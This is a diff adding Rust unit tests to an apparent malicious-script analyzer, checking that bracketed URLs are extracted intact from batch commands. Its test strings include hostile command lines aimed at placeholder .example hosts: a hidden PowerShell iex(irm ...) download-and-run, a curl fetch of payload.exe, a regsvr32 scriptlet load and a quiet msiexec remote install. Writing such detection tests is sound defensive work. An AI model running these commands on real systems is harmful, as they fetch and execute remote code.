@@ -920,6 +920,18 @@ mod echo_tests {
     }
 
     #[test]
+    fn start_quoted_url_preserves_bracketed_path() {
+        let script = b"start \"\" firefox -url \"https://opened.example/[a]/doc.pdf\"\r\n";
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(t,
+                Trait::UrlLaunch { url, .. } if url == "https://opened.example/[a]/doc.pdf")),
+            "start browser URL launch bracketed path was truncated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn start_browser_url_trailing_paren_is_trimmed() {
         let script =
             b"start powershell.exe -windowstyle hidden iex(irm https://start.example/p.png)\r\n";
@@ -3120,6 +3132,28 @@ for /f "tokens=1,* delims=:" %%A in ('findstr /o "https://" web.txt') do curl -o
                 )
             }),
             "FOR /F did not strip findstr /o prefix for later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_findstr_l_keeps_bracketed_literal_url() {
+        let report = analyze(
+            br#"echo https://findstr-literal.example/[a]/payload.exe>web.txt
+for /f "tokens=* delims=" %%U in ('findstr /l "https://findstr-literal.example/[a]/payload.exe" web.txt') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://findstr-literal.example/[a]/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F findstr /l literal URL was treated as regex: {:?}\n{}",
             report.traits,
             report.deobfuscated
         );
@@ -9086,10 +9120,12 @@ hh C:/Temp/payload.chm::/index.htm"#,
             &mut env,
         );
         interpret_line("msedge browser-direct.example/lure.pdf", &mut env);
+        interpret_line("chrome https://browser-direct.example/payload[1]", &mut env);
 
         for expected in [
             "https://explorer-direct.example/privacy/",
             "http://browser-direct.example/lure.pdf",
+            "https://browser-direct.example/payload[1]",
         ] {
             assert!(
                 env.traits
@@ -18423,6 +18459,31 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     }
 
     #[test]
+    fn regsvr32_scriptlet_url_in_deob_text_preserves_balanced_bracket_suffix() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let url = "http://regsvr32-scriptlet.example/payload[1]";
+        let line = format!(r#"regsvr32 /s /n /u /i:{url} scrobj.dll"#);
+        crate::deob_scan::scan_deob_text(&line, &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::UrlArgument { url: got, .. } if got == url
+            )
+        });
+        assert!(
+            has,
+            "regsvr32 deob-text bracketed scriptlet URL was truncated: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "regsvr32 deob-text bracketed scriptlet URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn regsvr32_equals_bound_scriptlet_url_in_deob_text_emits_typed_trait() {
         let mut env = crate::env::Environment::new(&Config::default());
         let url = "https://regsvr32-equals-deob.example/payload.sct";
@@ -18489,6 +18550,27 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
         assert!(
             has,
             "direct regsvr32 scriptlet URL not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn regsvr32_scriptlet_url_preserves_balanced_bracket_suffix() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::interp::interpret_line(
+            "regsvr32 /s /n /u /i:http://regsvr32-direct.example/payload[1] scrobj.dll",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { url, .. }
+                    if url == "http://regsvr32-direct.example/payload[1]"
+            )
+        });
+        assert!(
+            has,
+            "regsvr32 bracketed scriptlet URL was truncated: {:?}",
             env.traits
         );
     }
@@ -18761,6 +18843,27 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
         assert!(
             has,
             "direct msiexec package URL not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn msiexec_url_package_preserves_balanced_bracket_suffix() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::interp::interpret_line(
+            r#"msiexec /quiet /i "https://msiexec-direct.example/setup[1]""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { url, .. }
+                    if url == "https://msiexec-direct.example/setup[1]"
+            )
+        });
+        assert!(
+            has,
+            "msiexec bracketed URL argument was truncated: {:?}",
             env.traits
         );
     }
